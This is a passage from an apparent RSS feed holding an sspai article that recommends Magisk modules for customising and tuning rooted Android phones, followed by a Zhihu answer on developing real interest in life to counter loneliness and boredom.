最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>作为 Magisk 的核心，模块的工作方式各有不同：有的即装即用，有的需要使用终端进行配置，还有的则需要同其他的 App 协作。模块的获取途径也较为多样：除了直接从 App 中下载，我们还能从 XDA、酷安、Github 等处获得模块。因此，为了帮助刚刚刷入 Magisk 的用户减少探索的成本，一篇 Magisk 模块推荐是必要的。</p>\n<p>本文旨在向大家推荐一些优秀的 Magisk 模块，推荐的标准为：</p>\n<ul>\n<li>功能正常且仍在维护；</li>\n<li>需求较为广泛；</li>\n<li>适用范围广，支持大多数机型，且至少支持 Android 9 - 11。</li>\n</ul>\n<p>下文会把这些模块分为三类 ——个性化、功能增强、硬件和性能调控——分别介绍。若无特别说明，模块都能根据文内的小标题在 Magisk App 内找到。</p>\n<p>如果你未曾尝试 Magisk，也不妨看一看本文提及的模块是否有一些能切实帮助到你，说不定因此入了 Magisk 的坑。想要了解 Magisk 的刷入方法、模块的安装以及翻车自救方案的读者，请参阅本系列前两篇文章：</p>\n<ol>\n<li><a href=\"https://sspai.com/post/67932\" target=\"_blank\">Android 玩家必备神器入门：从零开始安装 Magisk</a></li>\n<li><a href=\"https://sspai.com/post/68071\" target=\"_blank\">Android 玩家必备神器入门：Magisk 核心功能和翻车自救指南</a></li>\n</ol>\n<h2>个性化</h2>\n<p>这类模块的功能涉及系统的视觉、听觉呈现。它们可以实现帮助你个性化系统的 UI、动画、字体以及声效。</p>\n<h3>自定义字体和 Emoji：Font Manager</h3>\n<p>Font Manager 作用是自定义系统的字体和 Emoji。相较于一些系统自带的字体管理工具，Font Manager 的优势在于数量达 200 多个，且全部免费。更改 Emoji 更是独有的功能。</p>\n<p>安装完成后，打开手机终端（如 Termux）用<code>su -c manage_fonts</code>唤出管理菜单，选择更换字体或 Emoji ，再键入选项对应的数字，重启即可更改成功。终端中不提供字体预览，建议提前到 <a href=\"https://www.androidacy.com/font-previewer/\" target=\"_blank\">此网站</a> 查看字体和 Emoji 的显示效果。</p>\n<p>下面是将 Emoji 改成 Blobmoji，字体改为 San Francisco 后同系统默认设置的对比截图，自定义后，你甚至能在 Android 上显示 Apple 独有的字符。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m4q0tb34tcu4buqusg.png\"></figure><p>需要注意，此模块安装后会自动跳转到含有广告的官网，建议随手关闭。另外，推特这类不使用系统字体、Emoji 的 App，Font Manager 没有效果。</p>\n<h3>补全字重：NotoCJK</h3>\n<blockquote><p><a href=\"https://github.com/simonsmh/notocjk\" target=\"_blank\">🔗项目地址</a> 从项目地址下载，手动安装。</p></blockquote>\n<p>本插件即装即用，效果直接看图：下面是同样一篇文章安装此模块前后的对比。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m4q15b34tcuopj7qv0.png\"></figure><p>可以看到，右侧的截图中，小标题明显更清晰。这是因为字重决定了字体呈现出的粗细。而在这个页面中，正文字重为 400，「要闻」、「简迅」字重为 600，「本期空缺」、「宁缺毋滥」字重为 700。而我的系统只有400 和 700 两种字重，故这两个小标题只能以 400 的字重呈现，我们便看到了左图那样的效果。NotoCJK 则通过补全缺失的字重，让该粗的字够粗，该细的字够细，使阅读体验好上不少。下面是更详细的对比图，装和不装差距之大肉眼可见：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m4q1db34tcu4buqut0.png\"></figure><h3>手势小横条自定义：Fullscreen/Immersive Gesture</h3>\n<p>该模块的作用是自定义全面屏手势的显示效果，具体来说包括：</p>\n<ol>\n<li>隐藏/沉浸显示手势小横条，控制手势灵敏度；</li>\n<li>在隐藏小横条时：减少键盘抬高高度；</li>\n<li>控制是否仅从右侧触发边缘返回手势。</li>\n</ol>\n<p>第一项功能很多 ROM 已经集成；而第二项功能对于一些非全面屏设备来说可谓福音，因为它们的下巴往往已经够大，不需要再抬高键盘。当边缘返回手势设置为只从右侧触发时，可以方便呼出一些应用位于左侧的汉堡菜单。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m4q1tb34tcuopj7qvg.png\"></figure><p>该模块配置的方式有点不同：需要在安装时根据提示用音量键确认选项。若想要更改配置，需要重刷一次。</p>\n<h3>通知栏、状态栏自定义：G-Visual</h3>\n<p>G-Visual 可用于调整系统 UI 的圆角弧度、通知栏的间距、状态栏的高度和间距以及手势横条的颜色、形状、透明度。除了自定义数值，模块也提供了一些预置的选项可供选择。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m4q25b34tcvt9nu64g.png\"></figure><p>安装之后，在终端输入<code>su</code>进入 Root 模式，再输入<code>gvm</code>就能进入模块的设置界面。确定选项后重启手机生效。</p>\n<h3>修改 Boot 动画：Nexus Media</h3>\n<p>手机启动时，一般会显示两个画面：首先出现带有 Android 图标和厂商 Logo 的界面，接下来就是一个动态的画面。Magisk 模块 Nexus Media 可修改后者为四个实心点变化为单词「android」的动效。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m4q35b34tcvciqa9b0.gif\"></figure><h3>移植来自 MIUI 的铃声：MIUI 10 Sound Pack</h3>\n<p>Magisk 曾经有许多移植类的模块，将一个 ROM 的特有的 App、壁纸或者铃声等提取出来，让其他 ROM 中也能使用。可惜过了这么多年，Pix3lify、Oxy-ify 等知名移植模块都已不再维护，可以说存活下来的并不多。MIUI 10 Sound Pack 则是其中之一。</p>\n<p>安装模块，系统的声音选择界面会多出来自 MIUI 的一些铃声。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m4q3db34tcvt9nu650.png\"></figure><h3>音质提升：Ainur Narsil 和 Spatial Audio Upmixer</h3>\n<blockquote><p><a href=\"https://forum.xda-developers.com/t/mod-ainur-audio-addon-spatial-audio-upmixer-05-08-upd.4301771/\" target=\"_blank\">🔗项目地址</a> Spatial Audio Upmixer 需要从项目地址下载，手动安装。</p></blockquote>\n<p>Ainur Narsil 像前面提到的字体模块 NotoCJK 一样拥有立竿见影的效果，它的作用是移除厂商对低端设备音频不走心的各类魔改，还原设备本身的声音，刷完就能明显感觉到音质变得更加「纯粹」，比如底噪降低等。</p>\n<p>此外，同模块的开发者不久前释出了名为 <a href=\"https://forum.xda-developers.com/t/mod-ainur-audio-addon-spatial-audio-upmixer-05-08-upd.4301771/\" target=\"_blank\">Spatial Audio Upmixer</a> 的模块，此模块能在 Android 设备上实现类似空间音频的效果，但相应地音质会有所下降。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m4q3lb34tcuopj7r00.png\"></figure><p>这两个模块都支持有线耳机和扬声器。团队还曾维护过另一款名为 SAURON 的模块，可惜现已停更。</p>\n<h2>功能增强</h2>\n<p>说完了个性化模块，我们再来看一看那些感官之外，切实增加或增强了某些功能的模块。</p>\n<h3>Hosts 管理和广告拦截：Energized Protection</h3>\n<p>此模块需要配合 Magisk 自带的 Systemless host （在 Magisk App 设置中开启）使用。它通过传统的挂载替换 Hosts 的方式，根据用户的配置定向域名。</p>\n<p>在终端中输入<code>su</code>进入 Root 模式，再使用<code>eq -h</code>便能查看所有支持的命令。比如说<code>ep -ir</code>能用于将某域名定向到某 IP，<code>ep -b example.com</code> 来屏蔽 example.com。模块也内置了一些规则，例如<code>ep -e social</code>可屏蔽社交广告。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m4q3tb34tcuopj7r0g.png\"></figure><h3>为单个 App 禁用自动更新：Detach</h3>\n<p>Google Play 有全局的自动更新功能，但不能单独排除某个应用。当我们关掉自动更新功能时，Google Play 的更新界面也不能像其他应用商店一样隐藏我们不愿意更新的应用。Detach 模块可以解决这个问题。</p>\n<p>在刷入模块之前，我们需要下载一份 <a href=\"https://raw.githubusercontent.com/sobuj53/Detach/master/Detach.txt\" target=\"_blank\">Detach.txt</a>。编辑这个文本文件，将我们不愿意更新的应用包名（Package name，如 OneDrive 是 <code>com.microsoft.skydrive</code>）写入其中，一行填一个名称。<code>#</code>开头的不生效。将此文件放入手机的根目录。然后刷入此模块，重启设备生效。</p>\n<p>如下图所示，Google Play 再也不会提醒你更新 OneDrive 了。想要加入新的应用名的话，重复上面一段的流程即可。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m4q4db34tcu4buqutg.png\"></figure><h3>更安全地精简预装应用：Debloater</h3>\n<p>Debloater 可以精简无法停用的系统预装应用。相比于 ADB 手动操作，它的优势在于不需要用户手动键入复杂的应用包名，只要选择终端中列出的数字。由于并非真正意义上的卸载，不小心出了错也可以及时挽救。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m4q4lb34tcu4buquu0.png\"></figure><p>此模块有一个对应的 App，最近才上架 F-Droid，也可以尝试。<a href=\"https://f-droid.org/packages/com.sunilpaulmathew.debloater/\" target=\"_blank\">🔗</a></p>\n<h3>使用来自其他厂商的应用：xmlpak</h3>\n<p>Google Play Store 不光是用户下载更新通用应用的场所，也是各个厂商更新自己的设备专属软件的地方，只不过这些软件其他的机型无法搜索到，即使找到了页面也会显示「设备不兼容」。xmlpak 解决了这个问题，让我们能够在 Play Store 上搜索安装市面上绝大多数厂商限定的应用。</p>\n<p>此模块安装后要清除应用商店的数据才能生效。它仅仅保证能下载安装，由于一些应用可能有其他的依赖，要顺利运行可能要额外的步骤。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m4q4tb34tcu4buquug.png\"></figure><h3>解锁 Google 信息流和位置记录：Riru - Location Report Enabler</h3>\n<p>默认情况下，由于存在检测机制，国内 SIM 卡会导致 Google App 和 Pixel 启动器中的信息流、Google 位置历史记录无法使用。Riru - Location Report Enabler 可以解除这一限制。</p>\n<p>安装后重启系统，然后清除 Google 应用缓存，信息流和位置记录就能正常开启。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m4q55b34tcvt9nu65g.png\"></figure><p>Location Report Enabler 是 Riru 系列模块之一，这类模块都需要提前安装名为 Riru 的模块才能生效。接下来将会连续介绍几个 Riru 系列的应用，它们都需要 Riru 模块这个依赖。</p>\n<h3>更高效的 Root 管理：Riru - Sui</h3>\n<p>虽然标题这么说，但 Sui 严格意义上并不是 Root，它将系统各类 API 打包给其他应用使用。同开发者亦为此开发了独立的 App <a href=\"https://shizuku.rikka.app/\" target=\"_blank\">Shizuku</a>。Sui 是 Shizuku 在 Magisk 上的实现。和 Root 相比，它更为精确且节制，不会出现一旦授予，系统的所有权限都被开放的情况。</p>\n<p>刷入 Sui 后，要进入管理界面，只需点击开发者选项，通知栏就会出现相关的入口。如果你正在使用的应用提供了 Sui 的支持，那么本文非常推荐你使用此选项。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m4q5lb34tcu4buquv0.png\"></figure><h3>允许后台读取剪贴板：Riru - Clipboard Whitelist</h3>\n<p>Android 10 之后，应用被禁止在后台读取剪贴板。因此一些旧的应用可能无法正确运行。Clipboard Whitelist 模块安装后，会添加一个名为 Clipboard 的应用。于此应用中勾选相应的程序即可让它们在后台获取读取剪贴板内容。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m4q5tb34tcuopj7r10.png\"></figure><p>不过，更新比较及时的应用们往往会建议你使用其他方法：比如说常驻通知栏，或者使用 ADB 授权。仅当应用没有给出这些新方法时，才推荐使用 Clipboard Whitelist。</p>\n<h3>挂载 Xposed：Riru - LSPosed</h3>\n<p>官方 Xposed 于 Android 7 折戟沉沙，不再适配新系统。但它仍然是一个无比强大的框架，借助 Magisk 的 LSPosed 模块，我们可以能「复活」Xposed。</p>\n<p>此模块安装后，系统会多出一个 LSPosed 的应用，使用这个应用就能管理 Xposed 的模块了。关于安装更详细的步骤，读者可以参阅下文的「隐藏应用列表」部分。</p>\n<ul><li><a href=\"https://sspai.com/post/67895\" target=\"_blank\">你的必要隐私手册（二）—— 控制联网与应用列表读取</a></li></ul>\n<p>此外，还有一个功能近似的模块 —— Riru - EdXposer，刷入后需要自行安装对应 <a href=\"https://github.com/ElderDrivers/EdXposedManager/releases\" target=\"_blank\">App</a>。此模块在更新频率和适用范围上不如 LSPosed 模块。</p>\n<h3>应用辅助类模块</h3>\n<p>不少模块需要配合其他的应用使用，它们往往起辅助作用，核心功能仍由应用本身承担。要是详细介绍这些模块，就不得不牵扯到应用本身的使用，这样就偏离了主题。因此，本文只在此处简单列举部分应用辅助类模块，并用简单的一句话概括。如果你需要使用对应的应用，那么这些模块就值得一试：</p>\n<ul>\n<li>F-Droid Privileged：同应用商店 F-Droid 配合，让它实现后台静默安装。</li>\n<li>Riru - Enhanced mode for Storage Isolation：存储隔离，同 Storage Redirect 配合。需要提前安装 Riru。详情可以参阅 <a href=\"https://sspai.com/post/67797\" target=\"_blank\">这一篇文章</a>。</li>\n<li>microG Installer：用于安装 microG 套件。</li>\n<li>Axet's Call Recorder：配合 <a href=\"https://f-droid.org/en/packages/com.github.axet.callrecorder/\" target=\"_blank\">Call Recorder</a> 使用，提供通话录音服务。</li>\n</ul>\n<h2>硬件和性能调控</h2>\n<p>此类模块涉及手机的电池、CPU 等硬件的各类行为。</p>\n<h3>电池健康：Advanced Charging Controller</h3>\n<p>在 Android 手机充电速度竞赛如火如荼的今天，电池健康这样一个同样重要的问题往往很少有人提及。锂电池有一定的寿命，<a href=\"https://batteryuniversity.com/article/bu-808-how-to-prolong-lithium-based-batteries\" target=\"_blank\">过高的电压、充电时的过高热量都会加速电池的老化</a>。</p>\n<p>Advanced Charging Controller 则通过限制电压、充电温度和最高充电容量的方式来延长电池的寿命。刷入模块后，在终端中使用<code>su</code>，<code>acc</code>的方式调出模块帮助，然后自行配置。开发者亦提供了 <a href=\"https://github.com/MatteCarra/AccA/releases\" target=\"_blank\">acca</a> 作为配套应用，读者可自行搭配安装。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m4q65b34tcvciqa9bg.png\"></figure><h3>性能调控：Uperf</h3>\n<blockquote><p><a href=\"https://github.com/yc9559/uperf/releases\" target=\"_blank\">🔗项目地址</a> 此模块需要手动安装</p></blockquote>\n<p>目前提供性能调节的 ROM 仍在少数。一般来说，想要更细致地控制系统性能需要借助第三方内核。但 Uperf 模块提供了更通用简易的方案──只要你使用的芯片受支持，就可以安装尝试一下。</p>\n<p>具体的原理在项目的 <a href=\"https://github.com/yc9559/uperf\" target=\"_blank\">README 文档</a> 中已有详细描述，简单来说就是通过一个固定运行的脚本监听 Android 系统发生的如正在操作的应用、触摸操作等事件来动态释放性能，而在释放性能的同时，它会有选择地采用更高效的 CPU 频率来降低功耗。另外值得一提的是，Uperf 还可以设置动态切换屏幕刷新率。</p>\n<p>刷入方式相当简单，从项目的 <a href=\"https://github.com/yc9559/uperf/releases\" target=\"_blank\">发布地址</a> 中下载最新的 DEV 版本 .zip 包，在 Magisk App 中手动刷入并重启系统，在手机存储根目录下的<code> /yc/uperf/</code> 中可以看到用于定义 Uperf 设置的文本文件，修改其中的值即可达成完全的自定义。建议新手可以先从修改 <code>cur_powermode</code> 文件开始自定义 <code>performance</code>、<code>balance</code>、<code>powersave</code> 三档性能模式开始体验。<code>cfg_uperf.json</code> 则是开发者定义的性能调整参数，不建议修改。<code>cfg_uperf_display</code> 则是用于自定义动态刷新率的配置文件。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m4q6db34tcvciqa9c0.png\"></figure><h2>总结</h2>\n<p>在写作本文时，我收集了所有来自官方库的模块，并给大多数模块标注了推荐等级和功能简介。若读者有兴趣，可以访问 <a href=\"https://mirtle.notion.site/0d51777111a041e7b003495e24cdf12e?v=48b435be9a8e46289e10d30b5f9c41b3\" target=\"_blank\">此网址</a> 查看。</p>\n<p>当然，疏漏之处，在所难免。许多模块虽然优秀，但流传范围不广。酒香也怕巷子深，要是读者还尝试过本文未提到的优秀模块，欢迎在评论区中补充。</p>\n<p>题图：<a href=\"https://www.freepik.com/vectors/banner\" target=\"_blank\">Banner vector created by fullvector</a></p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68531"},{"title":"你是用什么对抗孤独和无聊的呢？","date":"2021-08-30 03:53:18","description":"\n<h2>放弃从外部世界寻找乐趣，而多从自身内部寻找火花，建立起真正的“生活兴趣”。</h2>\n<p>“觉得自己的生活好没有意思，尽管一直在尝试寻找有意思的事情，但是觉得都好无趣”，孤独而无聊，已经成为了很多人对自己生活的评价。</p>\n<p>但我认为，很多时候我们为摆脱无聊和孤独而作出的努力，都并不是真正意义上的对于“生活兴趣”的找寻，我们可能都错误地理解了“有意思的生活”该是什么样子，才会做出那么多徒劳无功的尝试。</p>\n<p>要对抗孤独和无聊，我们需要首先明白，什么才是真正的对生活的兴趣。</p>\n<p>来看今天的回答。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-263f2616b5d7d173e55f4cf819c076f7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1023\" data-rawheight=\"668\" data-watermark=\"original\" data-original-src=\"v2-263f2616b5d7d173e55f4cf819c076f7\" data-watermark-src=\"v2-0e6e41cdaf053f3afcf79e96a0ca5cc4\" data-private-watermark-src=\"v2-eeddce7c847bf30b9973a8ed31162908\"></p>\n<h2><b>01.“生活兴趣”究竟是什么？</b></h2>\n<p>心理学家Paul J. Silvia把兴趣称为<b>“知识型的情绪（knowledge emotion）”</b>。</p>\n<p>所谓“知识型的情绪”，和我们熟知的喜怒哀乐不一样，指的是<b>能引发我们对“知道更多”好奇的情绪。</b>比如，困惑、惊奇、敬畏都属于知识型的情绪，他们都指引人们去知道更多。</p>\n<p>众所周知，兴趣是最好的老师，促进我们学习和探索。但大家可能不知道，兴趣也可以平衡人们对不确定性的负面感受(Kashdan,2004)。</p>\n<p>比如一个人失业在家，面对生活的不确定性，害怕再次失败。但如果ta能对一份渴望得到的工作产生兴趣，这种兴趣感会让ta产生对未来的好奇，而缓解不确定性带来的负面感受。</p>\n<p>*对于生活兴趣，人们有一些常见的误解，阻碍了他们培养出兴趣。</p>\n<h3><b>误解1: “不需要做什么，我就可以对某件事物一直感兴趣。”</b></h3>\n<p>很多人可能觉得兴趣是一劳永逸的，比如有人认为只要找到自己感兴趣的工作，就能对工作一直保持兴趣，于是频繁换工作。</p>\n<p>但现实是，日子久了，上班依然如上坟，兴趣又变成了煎熬。</p>\n<p>一个人对事物的兴趣会随时间产生变化，“三分钟热度”是常态，要对一件事物产生经久不衰的兴趣、始终觉得ta很有意思，需要我们首先投入经年累月的努力。</p>\n<p>这一点和很多人的认知不同：<b>有很多真正意义上的兴趣，都是通过怀着讨厌、忍受着没有兴趣却不得不投入的过程，才真正在人们心中扎根的。</b></p>\n<h3><b>误解2： “兴趣可以被‘找到’”</b></h3>\n<p>“怎么找到自己的兴趣所在？”——这样的提问蕴含了对兴趣的一种内隐态度，即认为兴趣是固定存在的，只待你去发现。</p>\n<p>然而，<b>相信兴趣是待被发现（find）而不是发展（develop）的人，对生活的热情更少，对新鲜事物的接受度也更低</b>（O'Keefe, et al., 2018）。<b>他们走到一个事物面前，发现哦这个我不感兴趣，然后就走开了，因此他们在生活中的投入往往不够多元、相对单一。</b></p>\n<p>从这两种迷思中我们可以看到，人们对生活缺乏兴趣的根本原因在于，<b>我们一直向外部世界去寻找兴趣，却没有从自己内部建立和发展兴趣。</b></p>\n<p>一方面，我们没有做什么努力，只是在生活中寻觅看不见摸不着的兴趣，等待兴趣自己找上门来。另一方面，有时最初产生的兴趣就并非我们内心真正的愿望，而只不过是被他人沉浸在兴趣中的样子短暂地吸引了。</p>\n<p>而想要真正觉得一些事情“很有意思”，产生反复做这件事都不会厌倦的状态，需要我们有“能力”足够充分地感受到这件事的美妙之处。<b>产生兴趣也是需要具备与之具备的能力的：</b></p>\n<p>比如逛美术馆，瞎逛和自拍的兴趣只能维持短暂的时间，而如果你曾经了解过这些作者、作品的故事，你才能更深入地品味它的“有意思”。</p>\n<p>你觉得对生活无法建立起兴趣，可能是你对生活的审美能力不够。需要付出学习、努力，才能够建立起对生活更强的审美能力来。<b>先苦后甜，一定程度上是生活兴趣的真相所在。</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-940ddb89d47c875d083f622a12a2b89f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"564\" data-rawheight=\"376\" data-watermark=\"original\" data-original-src=\"v2-940ddb89d47c875d083f622a12a2b89f\" data-watermark-src=\"v2-e234097bea27e5cc40260cbb15eae161\" data-private-watermark-src=\"v2-65638a9d334cbf93dea0d83a73dd6138\"></p>\n<h2><b>02.哪些因素影响了我们的生活兴趣？</b></h2>\n<p>Silvia通过两个实验发现，事物要想引发我们的兴趣，需要具备两个前提：其一，我们有可能去看懂它、理解它——<b>那些显然超过了我们当下的“审美”能力的事情，无论别人觉得多有意思，都无法打动我们。</b>因此，“装逼”选择一些看起来很“厉害”的事情，作为自己的兴趣，在实际的体验中是不能给我们提供积极体验的。</p>\n<p>其二，它需要具有新奇的复杂性（novelty–complexity），<b>它不能是我们理解不了的，但也不能是一眼看透的，它需要有一定的、可理解的复杂性，并且这种复杂是有新意的。</b></p>\n<p>找到新奇的人、事、物是很容易的。一家新开的餐厅、一部刚上映的电影、新认识的朋友……一切未知都可能是新奇的。但新奇本身不足够让我们产生兴趣。大多时候，我们“拔完草“、看过电影、面完基，就没有然后了。</p>\n<p>而想要真正发展兴趣，还需要我们在感到新奇的同时，主动去创造复杂性：去细细品味好吃的菜，去研究菜品的品鉴，去记住和分析看过的电影，去和新朋友建立更深入的联结……</p>\n<p><b>在创造、经历、理解复杂性的过程里，我们的兴趣才会真正被建立起来。</b>与其说生活本身不够有趣，让我们觉得没劲，不如说是我们没有把日子过得有意思起来。</p>\n<p>大多数人乐于接纳生活带来的好的一面，对于那些负面经验，ta们的态度是僵化而封闭的。对生活给予我们的东西，首先要<b>保持灵活性和开放性</b>——“可能这也可以，也许那也可以试试” ——这是把生活“过得有意思起来”首先要做到的第一步。</p>\n<p>我们的人格有一套指引自我去生活的想当然的结构，大多数人是活在这套<b>“经验结构”</b>中。有人无聊地活在那个符合自己经验的“舒适圈”里，无法产生兴趣。有人好不容易做了新的尝试，因为不符合自己的预期，放弃了兴趣。</p>\n<p>真正的投入生活意味着我们有勇气去拥抱生活的每一种变化，允许自己体会新的经验。如此，你才有可能创造和体验更多新奇的复杂性，从而发展出兴趣。</p>\n<p><b>让体验塑造生活，生活才有可能有意思。</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c39fec611b80a419fb150ac13a55f6e6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"563\" data-rawheight=\"446\" data-watermark=\"original\" data-original-src=\"v2-c39fec611b80a419fb150ac13a55f6e6\" data-watermark-src=\"v2-8be6e1c1980b9ec163822cbc0e0cc9be\" data-private-watermark-src=\"v2-648f136b63bc22f87e5b77744490d55c\"></p>\n<h2><b>03. 感到“生无可恋”，如何建立对生活的兴趣？</b></h2>\n<h3><b>1. 拥有更丰富的“人生面向”（life portfolio）。</b></h3>\n<p>所谓的人生面向，指的是一个人自我身份感的多元化程度。显然，那些有着更为丰富的人生面向的人，会更容易发展出多种多样的兴趣，也就是说，把我们的兴趣“不放在同一个篮子里”。</p>\n<p>当你觉得现在的生活没意思，我们可以转身面向那些由其他兴趣引领的生活面貌。比如你除了是一个职场人士，你是否在某一个感兴趣的领域颇有优势？或者你可以是健身达人、记录生活的手帐迷等等。</p>\n<p><b>你的身份和生活兴趣，永远都有地方可去，就不会觉得没意思。</b></p>\n<h3><b>2. 全身心地投入（engage）生活。</b></h3>\n<p>我们在关于生活兴趣的粉丝调查中发现，<b>生活投入程度和对生活的兴趣呈正相关，生活投入程度高的人，对生活的兴趣也更高</b>（p&lt;0.01）。</p>\n<p>我们希望你全身心地参与生活。这种对生活的参与和投入是专注的、富有创造力的，且需要付出努力的。</p>\n<p>投入的生活，聚焦于满足感而非愉悦感，他们会尽可能尝试各项活动，而不是只挑眼下会带给自己愉悦感的。<b>这种追求充实的满足，而不是当下的愉悦的生活方式，更能帮人建立对生活的兴趣。</b>（Seligman，2002）。</p>\n<p>如果一个人没有完全投入生活，也有可能获得愉悦感，比如靠消费纯粹享乐。但研究发现，<b>物质性消费带来的快乐是短暂的。</b>买买买可能让你快乐一时，但无法令你对生活更感兴趣。</p>\n<p>我们的调查也发现，消费水平与生活兴趣无显著相关。也就是说，有钱并不必然让人对生活更感兴趣。一个完全投入生活的人，铺床叠被、打扫房间这种最简单的行动，都有可能成为ta发挥创造力、感到生活很有意思的机会。</p>\n<h3><b>3. 提升感受力，体验正念生活。</b></h3>\n<p>想让生活变得更有意思，需要我们<b>调动自己全部的感官，全然感受生活的每一个细节</b>。我们有时候会觉得什么都没意思，生活无趣而索然无味。</p>\n<p>但要想把日子过得有意思，你首先要调整自己的生活态度，打起精神来，细致地、投入地品味你自己每一个当下的感受。</p>\n<p>生活不是忙碌或空虚地重复每个日子，兴趣也不是光靠找就能被发现。要建立对生活的兴趣，需要我们全身心地调动自己，以开放的态度，尝试更多的体验。</p>\n<p><b>它要求我们持续付出投入生活的努力，然后在生活中，勇敢地迎上自己自由成长地方向。</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-7c7df78e05b94f56302e024f878dc2c2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"658\" data-rawheight=\"800\" data-watermark=\"original\" data-original-src=\"v2-7c7df78e05b94f56302e024f878dc2c2\" data-watermark-src=\"v2-0549cf0e5f248c9c5adb95562f61a2ed\" data-private-watermark-src=\"v2-58a0126145c727ec97030dee0ec88ed0\"></p>\n<p>有些时候，我们对生活没什么兴趣，没什么劲头，总是感到无聊，却又十分讨厌这种无聊的感觉，不知道该怎么创造兴趣，只好不断刷手机，但越刷越觉得无聊。</p>\n<p>现代社会，高速的生活节奏以及源源不断的娱乐供养，使我们的胃口变得刁钻，越来越难以感受“新奇”。可以说，其实不是生活更无聊，只是我们已经变得更麻木了。</p>\n<p><b>对抗孤独和无聊，或许可以从认清有关它们的真相开始，然后重新审视、发现和培养属于自己的生活兴趣。</b></p>\n<p><br></p>\n<p>References：</p>\n<p>Harackiewicz, J. M., Smith,J. L., &amp; Priniski, S. J. (2016). Interest matters: The importance ofpromoting interest in education. Policy Insights from the Behavioral and BrainSciences, 3(2), 220-227.</p>\n<p>Kashdan, T.B. (2004).Curiosity. In C. Peterson &amp; M.E.P. Seligman (Eds.), Character strengths andvirtues (pp. 125–141). New York: Oxford University Press.</p>\n<p><br></p>\n<p><i>点击查看往期高赞回答：</i></p>\n<p><i><a href=\"https://www.zhihu.com/question/467881890/answer/2079190262\" class=\"internal\">在领悟到什么道理后，你的人生从此轻松了起来？</a></i></p>\n<p><i><a href=\"https://www.zhihu.com/question/30824529/answer/2068700177\" class=\"internal\">为何人随着年龄的增大觉得时间过得越来越快？</a></i></p>\n<p><i><a href=\"https://www.zhihu.com/question/20007033/answer/2039091143\" class=\"internal\">如何应对后悔的情绪？</a></i></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/knowyourself-1?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">KnowYourself</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/420313337/answer/2083548493?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">11935 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/350148191?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">感觉很孤单的时候，你会做什么？</a><br><a href=\"http://www.zhihu.com/question/412794404?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">生活中的你们有几个能叫出来，玩得来的朋友？孤独的你生活艰难吗？怎么熬过来的？</a><br>\n","link":"http://www.zhihu.com/question/420313337/answer/2083548493?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"你认为《真三国无双》系列游戏未来系统革新的方向是什么？","date":"2021-08-27 